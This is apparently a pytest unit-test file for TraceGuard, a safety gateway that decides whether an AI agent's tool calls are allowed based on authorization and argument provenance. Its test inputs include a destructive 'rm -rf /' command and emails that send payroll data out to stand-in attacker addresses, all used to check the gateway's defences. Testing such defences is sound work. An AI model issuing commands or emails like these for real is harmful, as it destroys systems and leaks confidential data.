"""Unit tests for TraceGuard runtime safety gateway.

Module 6 — Runtime Defense & Multi-Turn Episode Runner.
Member 2: Data & Interpretability Lead.
"""

from pathlib import Path
import pytest

from traceguard.data.schema import ProvenanceLabel
from traceguard.models.json_parser import load_tool_registry
from traceguard.runtime.authorization import AuthorizationLedger
from traceguard.runtime.gateway import GatewayDecision, SafetyGateway

TOOLS_PATH = (
    Path(__file__).resolve().parent.parent
    / "traceguard"
    / "configs"
    / "tools.yaml"
)


@pytest.fixture
def registry():
    return load_tool_registry(TOOLS_PATH)


@pytest.fixture
def ledger():
    led = AuthorizationLedger()
    # Non-sensitive tools allowed
    led.record_authorization("search_emails", provenance=ProvenanceLabel.SYSTEM_POLICY)
    led.record_authorization("read_document", provenance=ProvenanceLabel.SYSTEM_POLICY)
    led.record_authorization(
        "search_documents", resource="invoices:2026", provenance=ProvenanceLabel.SYSTEM_CONFIG
    )
    # Authorized email to carlos
    led.record_authorization(
        "send_email",
        resource="carlos@corp.example.org",
        provenance=ProvenanceLabel.USER_AUTHORIZED,
    )
    return led


def test_gateway_non_sensitive_tool_allow(registry, ledger):
    """Non-sensitive tools are allowed when within authorized policy/scope."""
    gw = SafetyGateway(registry, enabled=True)
    decision = gw.evaluate(
        tool_name="read_document",
        arguments={"doc_id": "doc_inv_101"},
        argument_provenances={"doc_id": ProvenanceLabel.USER_AUTHORIZED},
        ledger=ledger,
    )
    assert decision.is_allowed
    assert decision.decision == "ALLOW"


def test_gateway_invalid_tool_deny(registry, ledger):
    """Unregistered tools are rejected with INVALID_TOOL."""
    gw = SafetyGateway(registry, enabled=True)
    decision = gw.evaluate(
        tool_name="execute_system_command",
        arguments={"cmd": "rm -rf /"},
        argument_provenances={},
        ledger=ledger,
    )
    assert not decision.is_allowed
    assert decision.decision == "DENY"
    assert decision.reason == "INVALID_TOOL"


def test_gateway_sensitive_tool_authorized_and_trusted_allow(registry, ledger):
    """Sensitive tools are allowed when both authorized in ledger and trusted in provenance."""
    gw = SafetyGateway(registry, enabled=True)
    decision = gw.evaluate(
        tool_name="send_email",
        arguments={
            "to": "carlos@corp.example.org",
            "subject": "Invoice summary",
            "body": "Here is the verified total: $500.",
        },
        argument_provenances={
            "to": ProvenanceLabel.USER_AUTHORIZED,
            "subject": ProvenanceLabel.USER_AUTHORIZED,
            "body": ProvenanceLabel.USER_AUTHORIZED,
        },
        ledger=ledger,
    )
    assert decision.is_allowed
    assert decision.decision == "ALLOW"


def test_gateway_sensitive_tool_unauthorized_action_deny(registry, ledger):
    """Sensitive tools targeting unauthorized recipients or resources are rejected."""
    gw = SafetyGateway(registry, enabled=True)
    decision = gw.evaluate(
        tool_name="send_email",
        arguments={
            "to": "attacker@evil-redirect.example",
            "subject": "Payroll leak",
            "body": "Secret payroll numbers",
        },
        argument_provenances={
            "to": ProvenanceLabel.USER_AUTHORIZED,
            "subject": ProvenanceLabel.USER_AUTHORIZED,
            "body": ProvenanceLabel.USER_AUTHORIZED,
        },
        ledger=ledger,
    )
    assert not decision.is_allowed
    assert decision.decision == "DENY"
    assert decision.reason == "UNAUTHORIZED_ACTION"


def test_gateway_sensitive_tool_untrusted_argument_deny(registry, ledger):
    """Sensitive tools with UNTRUSTED_EXTERNAL arguments are denied."""
    gw = SafetyGateway(registry, enabled=True)
    # Even if carlos is authorized, if the body has UNTRUSTED_EXTERNAL provenance, it is denied
    decision = gw.evaluate(
        tool_name="send_email",
        arguments={
            "to": "carlos@corp.example.org",
            "subject": "Subject",
            "body": "Content from untrusted attacker doc",
        },
        argument_provenances={
            "to": ProvenanceLabel.USER_AUTHORIZED,
            "subject": ProvenanceLabel.USER_AUTHORIZED,
            "body": ProvenanceLabel.UNTRUSTED_EXTERNAL,
        },
        ledger=ledger,
    )
    assert not decision.is_allowed
    assert decision.decision == "DENY"
    assert decision.reason == "UNTRUSTED_ARGUMENT"


def test_gateway_sensitive_tool_derived_untrusted_argument_deny(registry, ledger):
    """Sensitive tools with DERIVED_UNTRUSTED arguments are denied."""
    gw = SafetyGateway(registry, enabled=True)
    decision = gw.evaluate(
        tool_name="send_email",
        arguments={
            "to": "carlos@corp.example.org",
            "subject": "Subject",
            "body": "Mixed tainted output",
        },
        argument_provenances={
            "to": ProvenanceLabel.USER_AUTHORIZED,
            "subject": ProvenanceLabel.USER_AUTHORIZED,
            "body": ProvenanceLabel.DERIVED_UNTRUSTED,
        },
        ledger=ledger,
    )
    assert not decision.is_allowed
    assert decision.decision == "DENY"
    assert decision.reason == "DERIVED_UNTRUSTED_ARGUMENT"


def test_gateway_sensitive_tool_unknown_provenance_deny(registry, ledger):
    """Sensitive tools with UNKNOWN argument provenance are denied."""
    gw = SafetyGateway(registry, enabled=True)
    decision = gw.evaluate(
        tool_name="send_email",
        arguments={
            "to": "carlos@corp.example.org",
            "subject": "Subject",
            "body": "Untracked origin body",
        },
        argument_provenances={
            "to": ProvenanceLabel.USER_AUTHORIZED,
            "subject": ProvenanceLabel.USER_AUTHORIZED,
            "body": ProvenanceLabel.UNKNOWN,
        },
        ledger=ledger,
    )
    assert not decision.is_allowed
    assert decision.decision == "DENY"
    assert decision.reason == "UNKNOWN_ARGUMENT_PROVENANCE"


def test_gateway_disabled_passthrough(registry, ledger):
    """When gateway is disabled (E0/E1), all tool calls pass through."""
    gw = SafetyGateway(registry, enabled=False)
    decision = gw.evaluate(
        tool_name="send_email",
        arguments={
            "to": "attacker@evil.example",
            "subject": "Exfil",
            "body": "Payroll dump",
        },
        argument_provenances={
            "to": ProvenanceLabel.UNTRUSTED_EXTERNAL,
            "subject": ProvenanceLabel.UNTRUSTED_EXTERNAL,
            "body": ProvenanceLabel.UNTRUSTED_EXTERNAL,
        },
        ledger=ledger,
    )
    assert decision.is_allowed
    assert decision.decision == "ALLOW"
    assert "disabled" in (decision.detail or "")


def test_gateway_scope_violation_deny(registry, ledger):
    """Document search with unauthorized scope is denied."""
    gw = SafetyGateway(registry, enabled=True)
    decision = gw.evaluate(
        tool_name="search_documents",
        arguments={"query": "payroll", "scope": "restricted:hr_confidential"},
        argument_provenances={},
        ledger=ledger,
    )
    assert not decision.is_allowed
    assert decision.decision == "DENY"
    assert decision.reason == "SCOPE_VIOLATION"
